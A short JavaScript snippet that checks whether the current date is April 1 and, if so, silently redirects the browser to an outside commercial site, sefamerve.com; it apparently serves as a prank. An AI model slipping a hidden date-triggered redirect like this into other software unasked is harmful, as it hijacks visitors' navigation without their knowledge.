var aprilFools = {
  month: 3,
  date: 1
}

function isItAprilFoolDay() {
  var now = new Date();
  return (now.getMonth() == aprilFools.month && now.getDate() == aprilFools.date);
}

if (isItAprilFoolDay()) {
    location.href = 'https://sefamerve.com'
}